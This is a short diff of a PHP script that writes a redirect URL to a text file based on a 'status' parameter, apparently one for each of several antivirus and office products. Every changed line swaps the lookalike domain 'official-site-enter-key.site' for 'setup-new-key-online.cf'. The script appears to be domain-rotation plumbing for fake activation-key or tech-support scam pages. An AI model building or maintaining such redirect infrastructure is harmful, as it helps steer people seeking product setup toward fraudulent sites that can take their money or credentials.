@@ -13,28 +13,28 @@ if(!empty($_GET['status']))
     elseif($param == "actnor")
     {
         $myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
-        $txt = "https://official-site-enter-key.site/actnor/";
+        $txt = "https://setup-new-key-online.cf/actnor/";
         fwrite($myfile, $txt);
         fclose($myfile); 
     }
     elseif($param == "actmca")
     {
         $myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
-        $txt = "https://official-site-enter-key.site/actmca/";
+        $txt = "https://setup-new-key-online.cf/actmca/";
         fwrite($myfile, $txt);
         fclose($myfile); 
     }
     elseif($param == "actoff")
     {
         $myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
-        $txt = "https://official-site-enter-key.site/actoff/setup_in.php";
+        $txt = "https://setup-new-key-online.cf/actoff/setup_in.php";
         fwrite($myfile, $txt);
         fclose($myfile); 
     }
     elseif($param == "actyou")
     {
         $myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
-        $txt = "https://official-site-enter-key.site/actyou/";
+        $txt = "https://setup-new-key-online.cf/actyou/";
         fwrite($myfile, $txt);
         fclose($myfile); 
     }
